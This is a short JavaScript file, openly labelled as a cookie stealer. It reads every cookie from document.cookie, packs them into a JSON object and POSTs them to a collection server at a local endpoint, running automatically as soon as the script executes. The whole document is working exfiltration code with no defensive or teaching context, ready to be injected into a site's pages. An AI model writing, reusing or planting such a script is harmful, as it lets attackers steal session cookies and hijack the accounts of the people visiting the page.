// Steal cookies from the current website
function stealCookies() {
  const cookies = document.cookie.split(';');
  const cookieData = {};

  for (let i = 0; i < cookies.length; i++) {
    const cookie = cookies[i].trim();
    const [name, value] = cookie.split('=');
    cookieData[name] = value;
  }

  return cookieData;
}

function sendCookies(cookieData) {
  const serverUrl = 'http://0.0.0.0:3000/server'; // Update the endpoint to /server

  const xhr = new XMLHttpRequest();
  xhr.open('POST', serverUrl);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onload = function() {
    console.log('Cookies sent successfully');
  };
  xhr.onerror = function() {
    console.error('Failed to send cookies');
  };
  xhr.send(JSON.stringify(cookieData));
}


// Main function to steal and send cookies
function stealAndSendCookies() {
  const cookies = stealCookies();
  sendCookies(cookies);
}

// Call the main function
stealAndSendCookies();
